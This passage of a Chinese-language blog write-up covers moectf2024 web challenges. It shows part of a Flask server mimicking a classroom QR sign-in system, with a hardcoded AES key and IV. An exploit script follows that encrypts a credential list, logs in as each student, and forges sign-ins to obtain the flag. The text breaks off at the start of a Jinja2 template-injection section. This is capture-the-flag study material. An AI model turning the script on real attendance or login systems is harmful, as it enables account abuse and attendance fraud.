class="string">&quot;msg&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;data&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;errorMsg&quot;</span>: <span class="literal">None</span>&#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>: <span class="number">0</span>, <span class="string">&quot;msg&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;data&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;errorMsg&quot;</span>: <span class="string">&quot;Invalid arguments.&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/widget/sign/pcTeaSignController/showSignInfo1&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_sign_info</span>():</span><br><span class="line">    signed = []</span><br><span class="line">    unsigned = []</span><br><span class="line">    uniq_id = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sign_list:</span><br><span class="line">        c = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: uniq_id,</span><br><span class="line">            <span class="string">&quot;uid&quot;</span>: i[<span class="string">&quot;uid&quot;</span>],</span><br><span class="line">            <span class="string">&quot;activeId&quot;</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">&quot;status&quot;</span>: i[<span class="string">&quot;status&quot;</span>],</span><br><span class="line">            <span class="string">&quot;createtime&quot;</span>: get_current_timestamp(),</span><br><span class="line">            <span class="string">&quot;updatetime&quot;</span>: get_current_timestamp(),</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: i[<span class="string">&quot;name&quot;</span>],</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;isdelete&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;qasort&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;sasort&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;longitude&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;latitude&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;longitude_gd&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;latitude_gd&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;distance&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;distanceStr&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;xxuid&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;clientip&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;issend&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;useragent&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;confidence&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;islook&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;isshow&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;score&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;skscore&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;result&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;title&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;iphoneContent&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;ismark&quot;</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">&quot;submittime&quot;</span>: datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>),</span><br><span class="line">            <span class="string">&quot;groupId&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;taskavg&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;content&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;answerScore&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;answerTime&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;teacherGiveScore&quot;</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">&quot;isPrompted&quot;</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">&quot;mutualEvaluationId&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;pingyu&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;tag&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;flowerCount&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;schoolname&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;fid&quot;</span>: <span class="number">20</span>,</span><br><span class="line">            <span class="string">&quot;screenContent&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;screenimages\moectf2024&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;iframeCount&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;showScore&quot;</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">&quot;teaScore&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;ifGiveScore&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;taskScoreRecored&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;taskTeacherEvaluation&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;updatetimeStr&quot;</span>: datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>),</span><br><span class="line">            <span class="string">&quot;stuGetAnswerTime&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;teaGetAnswerTime&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(i[<span class="string">&quot;status&quot;</span>]) <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">5</span>, <span class="number">11</span>]:</span><br><span class="line">            unsigned.append(c)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            signed.append(c)</span><br><span class="line">        uniq_id += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    response = &#123;</span><br><span class="line">        <span class="string">&quot;result&quot;</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;获取数据成功&quot;</span>,</span><br><span class="line">        <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;yiqianList&quot;</span>: signed,</span><br><span class="line">            <span class="string">&quot;changeUnSignList&quot;</span>: unsigned,</span><br><span class="line">            <span class="string">&quot;total&quot;</span>: <span class="built_in">len</span>(sign_list),</span><br><span class="line">            <span class="string">&quot;yiqian&quot;</span>: <span class="built_in">len</span>(signed)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;errorMsg&quot;</span>: <span class="literal">None</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> jsonify(response)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/widget/active/endActive&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">end_active</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> token <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> token <span class="keyword">not</span> <span class="keyword">in</span> token_user <span class="keyword">or</span> token_user[token] != teacher_phone:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;result&quot;</span>: <span class="number">0</span>, <span class="string">&quot;msg&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;data&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;errorMsg&quot;</span>: <span class="string">&quot;当前登录的账号不是教师，无法结束活动。&quot;</span>&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">global</span> active_status</span><br><span class="line">    active_status = <span class="number">2</span></span><br><span class="line">    response = &#123;</span><br><span class="line">        <span class="string">&quot;result&quot;</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;success&quot;</span>,</span><br><span class="line">        <span class="string">&quot;data&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">        <span class="string">&quot;errorMsg&quot;</span>: <span class="literal">None</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sign_list:</span><br><span class="line">        <span class="keyword">if</span> i[<span class="string">&quot;status&quot;</span>] != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(response)</span><br><span class="line">    </span><br><span class="line">    response[<span class="string">&quot;errorMsg&quot;</span>] = read_flag()</span><br><span class="line">    <span class="keyword">return</span> jsonify(response)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/v2/apis/sign/refreshQRCode&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">refreash_QRCode</span>():</span><br><span class="line">    <span class="keyword">global</span> sign_code, enc</span><br><span class="line">    sign_code = <span class="built_in">str</span>(random.randint(<span class="number">3000000000000</span>, <span class="number">4000000000000</span>))</span><br><span class="line">    enc = <span class="string">&quot;&quot;</span>.join(random.choice([<span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;9&quot;</span>, <span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;F&quot;</span>]) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>))</span><br><span class="line">    response = &#123;</span><br><span class="line">        <span class="string">&quot;result&quot;</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;success&quot;</span>,</span><br><span class="line">        <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;enc&quot;</span>: enc,</span><br><span class="line">            <span class="string">&quot;signCode&quot;</span>:sign_code</span><br><span class="line">        &#125;, </span><br><span class="line">        <span class="string">&quot;errorMsg&quot;</span>: <span class="literal">None</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> jsonify(response)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/widget/sign/pcTeaSignController/getCount&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_count</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;currentTime&quot;</span>: get_current_timestamp(),</span><br><span class="line">        <span class="string">&quot;yiqian&quot;</span>: <span class="built_in">len</span>(sign_list),</span><br><span class="line">        <span class="string">&quot;timeLong&quot;</span>: time_long,</span><br><span class="line">        <span class="string">&quot;activeStatus&quot;</span>: active_status, </span><br><span class="line">        <span class="string">&quot;startTime&quot;</span>: start_timestamp</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    response = &#123;</span><br><span class="line">        <span class="string">&quot;result&quot;</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;获取成功&quot;</span>,</span><br><span class="line">        <span class="string">&quot;data&quot;</span>: data,</span><br><span class="line">        <span class="string">&quot;errorMsg&quot;</span>: <span class="literal">None</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> jsonify(response)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    loginType = request.args.get(<span class="string">&quot;loginType&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> loginType == <span class="string">&quot;2&quot;</span> <span class="keyword">or</span> loginType == <span class="string">&quot;3&quot;</span>:</span><br><span class="line">        abort(<span class="number">501</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/fanyalogin&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fanya_login</span>():</span><br><span class="line">    data = request.form</span><br><span class="line">    phone = data.get(<span class="string">&quot;uname&quot;</span>).strip()</span><br><span class="line">    pwd = data.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">    t = data.get(<span class="string">&quot;t&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> t == <span class="string">&quot;true&quot;</span>:</span><br><span class="line">        key = <span class="string">&quot;u2oh6Vu^HWe4_AES&quot;</span></span><br><span class="line">        iv = <span class="string">&quot;u2oh6Vu^HWe4_AES&quot;</span></span><br><span class="line">        pwd = decrypt_by_aes(pwd, key, iv)</span><br><span class="line">        phone = decrypt_by_aes(phone, key, iv)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> check_credentials(phone, pwd):</span><br><span class="line">        token = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">        token_user[token] = phone</span><br><span class="line">        resp = make_response(jsonify(&#123;<span class="string">&quot;status&quot;</span>: <span class="literal">True</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;/&quot;</span>&#125;))</span><br><span class="line">        resp.set_cookie(<span class="string">&quot;token&quot;</span>, token, max_age=<span class="number">7</span>*<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>)</span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;status&quot;</span>: <span class="literal">False</span>, <span class="string">&quot;msg2&quot;</span>: <span class="string">&quot;手机号或密码错误&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pwd/findpwd&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_pwd</span>():</span><br><span class="line">    abort(<span class="number">501</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/enroll&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enroll</span>():</span><br><span class="line">    abort(<span class="number">501</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/v5/toCustomer&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_customer</span>():</span><br><span class="line">    abort(<span class="number">501</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/widget/sign/e&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> token <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> token <span class="keyword">not</span> <span class="keyword">in</span> token_user <span class="keyword">or</span> token_user[token] == teacher_phone:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&quot;id&quot;</span>) != <span class="built_in">str</span>(active_id) <span class="keyword">or</span> request.args.get(<span class="string">&quot;c&quot;</span>) != sign_code <span class="keyword">or</span> request.args.get(<span class="string">&quot;enc&quot;</span>) != enc:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;二维码已过期。&quot;</span></span><br><span class="line">    uid = token_user[token]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sign_list:</span><br><span class="line">        <span class="keyword">if</span> i[<span class="string">&quot;uid&quot;</span>] == <span class="built_in">int</span>(uid):</span><br><span class="line">            <span class="keyword">if</span> i[<span class="string">&quot;status&quot;</span>] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> active_status == <span class="number">2</span>:</span><br><span class="line">                    i[<span class="string">&quot;status&quot;</span>] = <span class="number">11</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    i[<span class="string">&quot;status&quot;</span>] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> status[i[<span class="string">&quot;status&quot;</span>]]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/page/sign/signIn&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign_in</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;signIn.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    gen(<span class="number">0</span>, <span class="number">10000000</span>, <span class="number">1024</span>)</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8888</span>, debug=<span class="literal">False</span>, threaded=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下一步就是get二维码链接了，关键二维码要有效，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> request.args.get(<span class="string">&quot;id&quot;</span>) != <span class="built_in">str</span>(active_id) <span class="keyword">or</span> request.args.get(<span class="string">&quot;c&quot;</span>) != sign_code <span class="keyword">or</span> request.args.get(<span class="string">&quot;enc&quot;</span>) != enc:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;二维码已过期。&quot;</span></span><br></pre></td></tr></table></figure><p>id&#x3D; 4000000000000且c值为signcode，这个在题目的hint的API里有，enc同理</p><p>然后这些就是一次完整的签到过程了，循环操作，直到所有学生签到完成为止</p><p>最后的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_post_to_login_and_signin</span>(<span class="params">enc</span>):</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&#x27;http://192.168.119.1:50631/fanyalogin&#x27;</span></span><br><span class="line">    url_1 = <span class="string">&quot;http://192.168.119.1:50631/widget/sign/e?id=4000000000000&amp;c=3485287101270&amp;enc=4C76F3FAA53372B936C91BA89F2C30E4&amp;DB_STRATEGY=PRIMARY_KEY&amp;STRATEGY_PARA=id&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建会话对象</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;192.168.119.1:50631&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/javascript, */*; q=0.01&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://192.168.119.1:50631&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://192.168.119.1:50631/login&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;fid&quot;</span>: <span class="string">&quot;-1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;uname&quot;</span>: enc,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: enc,</span><br><span class="line">        <span class="string">&quot;refer&quot;</span>: <span class="string">&quot;https://i.chaoxing.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;t&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">        <span class="string">&quot;forbidotherlogin&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;validate&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;doubleFactorLogin&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;independentId&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;independentNameId&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># URL 编码 data</span></span><br><span class="line">    encoded_data = urlencode(data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送 POST 请求</span></span><br><span class="line">    response = session.post(url, headers=headers, data=encoded_data)</span><br><span class="line">    response_1=session.get(url_1)</span><br><span class="line">    <span class="built_in">print</span>(response_1.status_code)</span><br><span class="line">    <span class="comment"># 关闭会话</span></span><br><span class="line">    session.close()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\1\Downloads\MOE\log.txt&quot;</span>, <span class="string">&quot;a&quot;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> log_file:</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            log_file.write(<span class="string">f&quot;Response for <span class="subst">&#123;enc&#125;</span>: <span class="subst">&#123;response.text&#125;</span>\n&quot;</span>)</span><br><span class="line">            log_file.write(<span class="string">f&quot;Response for <span class="subst">&#123;enc&#125;</span>: <span class="subst">&#123;response_1.text&#125;</span>\n&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            log_file.write(<span class="string">f&quot;Error for <span class="subst">&#123;enc&#125;</span>: <span class="subst">&#123;response.status_code&#125;</span> - <span class="subst">&#123;response.text&#125;</span>\n&quot;</span>)</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response.json()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_by_aes</span>(<span class="params">plain_text: <span class="built_in">str</span>, key: <span class="built_in">str</span>, iv: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    key_bytes = key.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    iv_bytes = iv.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 填充，使得待加密数据长度为16的倍数</span></span><br><span class="line">    pad = <span class="number">16</span> - (<span class="built_in">len</span>(plain_text) % <span class="number">16</span>)</span><br><span class="line">    plain_text_padded = plain_text + (<span class="built_in">chr</span>(pad) * pad)</span><br><span class="line">    plain_text_bytes = plain_text_padded.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加密数据</span></span><br><span class="line">    encrypted_bytes = cipher.encrypt(plain_text_bytes)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用 base64 编码以便安全传输</span></span><br><span class="line">    encrypted_base64 = base64.b64encode(encrypted_bytes).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> encrypted_base64</span><br><span class="line"><span class="comment">#uname和pwd加密后列表 </span></span><br><span class="line">enc_ls=[]</span><br><span class="line">login_data=<span class="built_in">open</span>(<span class="string">r&quot;C:\Users\1\Downloads\MOE\output.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">login_ls=login_data.readlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(login_ls)):</span><br><span class="line">    enc_ls.append(encrypt_by_aes(login_ls[i].strip(),<span class="string">&quot;u2oh6Vu^HWe4_AES&quot;</span>,<span class="string">&quot;u2oh6Vu^HWe4_AES&quot;</span>))</span><br><span class="line"><span class="comment">#学生登陆签到</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc_ls)):</span><br><span class="line">    send_post_to_login_and_signin(enc_ls[i])</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2024/10/13/moectf2024-web%E6%96%B9%E5%90%91wp/re2.png" alt="re2"></p><p><strong>moectf{U_ar3_4_GO0d-T34cH3r-LOV3d-6Y-3V3rY0N3303ef288}</strong></p><h2 id="who’s-blog"><a href="#who’s-blog" class="headerlink" title="who’s blog?"></a><strong>who’s blog?</strong></h2><p>hint：提供你的id来领养这个可怜的网站吧</p><p>一开始没有任何思路，后来问了出题人，出题人hint：flask+jinja2</p><p>后来查了点资料做出来了；</p><p>这题的考点正是jinja2的ssti漏洞；</p><p>知识点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flask是python的一个轻量级web框架</span><br><span class="line">jinja2模板属于flask，用于渲染html文件，在其语法中，“&#123;&#123; 